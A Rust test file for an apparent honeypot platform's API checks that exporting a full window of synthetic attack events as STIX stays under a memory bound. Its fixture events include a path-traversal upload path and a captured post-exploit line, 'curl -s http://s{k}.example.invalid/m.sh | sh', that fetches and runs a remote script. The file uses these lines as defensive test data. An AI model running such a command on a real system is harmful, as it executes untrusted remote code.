//! Rough resource bound for exports (#13): with 20,000 events in the
//! window (the attempts cap), a STIX download must stay well inside the
//! Workers 128 MB isolate limit. Exports read at most
//! `EXPORT_WINDOW_EVENTS` per request and say where to continue. `peak_alloc` tracks the peak heap; the
//! test measures how far a request raises it above what the store already
//! holds. Debug and release builds allocate alike.

use std::sync::Arc;

use axum::body::Body;
use foiled_api::auth::sha256_hex;
use foiled_api::memory::MemoryStore;
use foiled_api::routes::attempts::MAX_WINDOW_EVENTS;
use foiled_api::store::{Store, TokenRecord};
use foiled_api::{AppState, router};
use foiled_core::auth::{Role, Scope};
use foiled_core::capture::CaptureEvent;
use http::Request;
use http_body_util::BodyExt;
use peak_alloc::PeakAlloc;
use serde_json::json;
use tower::ServiceExt;

#[global_allocator]
static PEAK: PeakAlloc = PeakAlloc;

const SECRET: &str = "0123456789abcdef0123456789abcdef";
const T0: i64 = 1_792_285_323_000;
const MB: usize = 1024 * 1024;
/// Peak heap a request may add. The isolate limit is 128 MB.
const BOUND: usize = 64 * MB;

/// Nine events per attempt, every value distinct, so every attempt yields
/// about nine publishable IOCs: the worst case for object count.
fn events(n_attempts: usize) -> Vec<CaptureEvent> {
    let mut out = Vec::new();
    let ranges = ["192.0.2", "198.51.100", "203.0.113"];
    for k in 0..n_attempts {
        let ip = format!("{}.{}", ranges[k % 3], (k / 3) % 256);
        let decoy = format!("dcy-b{}", k / 768);
        let t = T0 + (k as i64) * 1_000;
        let ev = |n: usize, channel: &str, src: &str, extra: serde_json::Value| {
            let mut v = json!({
                "event_id": format!("b-{k}-{n}"), "ts": t + n as i64,
                "decoy_id": decoy, "catalogue_id": "foiled/demo-app/1.0.0",
                "decoy_kind": "sandbox", "channel": channel, "severity": "high",
                "src": {"ip": src}, "dst": {"ip": "10.85.1.2", "port": 8080},
                "tenant_id": "t1", "source": {"kind": "host", "id": "host-1"}, "data": {}
            });
            if let serde_json::Value::Object(m) = extra {
                for (key, val) in m {
                    v[key] = val;
                }
            }
            serde_json::from_value::<CaptureEvent>(v).unwrap()
        };
        let hook = |stage: &str, extra: serde_json::Value| {
            let mut h = json!({"hook_id": "demo-app.upload-path-traversal",
                "catalogue_id": "foiled/demo-app/1.0.0", "cve_id": "FOILED-DEMO-0001",
                "stage": stage, "sequence_no": 1, "t_offset_ms": 1});
            if let serde_json::Value::Object(m) = extra {
                for (key, val) in m {
                    h[key] = val;
                }
            }
            h
        };
        out.push(ev(0, "application", &ip, json!({"data": {"method": "GET", "path": format!("/probe/{k}"), "user_agent": format!("bound-tool/{k}")}})));
        out.push(ev(1, "application", &ip, json!({"data": {"method": "POST", "path": format!("/api/upload?path=../{k}"), "body_sha256": format!("{:064x}", k)}})));
        out.push(ev(2, "hook", &ip, json!({"hook": hook("trigger", json!({})), "data": {"request_path": format!("/api/upload?path=../{k}")}})));
        out.push(ev(3, "hook", &ip, json!({"hook": hook("post_exploit", json!({"cmd_lines": [format!("sh -c 'curl -s http://s{k}.example.invalid/m.sh | sh'")]})), "data": {}})));
        out.push(ev(
            4,
            "dns",
            "10.85.1.2",
            json!({"data": {"query": format!("c{k}.example.invalid"), "qtype": "TXT"}}),
        ));
        out.push(ev(5, "egress", "10.85.1.2", json!({"dst": {"ip": "198.51.100.200", "port": 80}, "data": {"host": format!("s{k}.example.invalid"), "method": "GET", "path": "/m.sh", "verdict": "blocked"}})));
        out.push(ev(
            6,
            "dns",
            "10.85.1.2",
            json!({"data": {"query": format!("d{k}.example.invalid"), "qtype": "A"}}),
        ));
        out.push(ev(7, "egress", "10.85.1.2", json!({"dst": {"ip": "198.51.100.201", "port": 80}, "data": {"host": format!("e{k}.example.invalid"), "method": "POST", "path": "/c", "verdict": "blocked"}})));
        out.push(ev(8, "application", &ip, json!({"data": {"method": "GET", "path": format!("/after/{k}"), "user_agent": format!("bound-tool/{k}")}})));
    }
    out
}

async fn get(state: &AppState, path: &str) -> (u16, usize, http::HeaderMap) {
    let req = Request::get(path)
        .header("authorization", format!("Bearer fo_lead.{SECRET}"))
        .body(Body::empty())
        .unwrap();
    let res = router(state.clone()).oneshot(req).await.unwrap();
    let status = res.status().as_u16();
    let headers = res.headers().clone();
    let bytes = res.into_body().collect().await.unwrap().to_bytes();
    (status, bytes.len(), headers)
}

#[tokio::test]
async fn a_full_window_stays_well_under_the_isolate_limit() {
    let store = Arc::new(MemoryStore::new());
    store.add_token(TokenRecord {
        id: "lead".into(),
        tenant_id: "t1".into(),
        role: Role::Human,
        scopes: vec![Scope::ExportsRead],
        secret_sha256: sha256_hex(SECRET),
        expires_at: None,
        revoked: false,
    });
    let evs = events(MAX_WINDOW_EVENTS / 9);
    assert!(evs.len() <= MAX_WINDOW_EVENTS && evs.len() > MAX_WINDOW_EVENTS - 9);
    store.enqueue_events(evs).await.unwrap();
    let state = AppState::new(store, Arc::new(|| T0 + 24 * 3_600_000));

    let path = "/v0/exports/stix";
    let base = PEAK.current_usage();
    PEAK.reset_peak_usage();
    let (status, len, headers) = get(&state, path).await;
    let peak = PEAK.peak_usage().saturating_sub(base);
    assert_eq!(status, 200, "{path}");
    assert!(len > 0);
    eprintln!(
        "{path}: peak {} MB above the store, body {} KB",
        peak / MB,
        len / 1024
    );
    assert!(peak < BOUND, "{path}: peak heap {} MB", peak / MB);
    // The window was cut and says where to continue.
    assert_eq!(headers["x-foiled-truncated"], "true");
    assert!(headers.contains_key("x-foiled-next-cursor"));
}
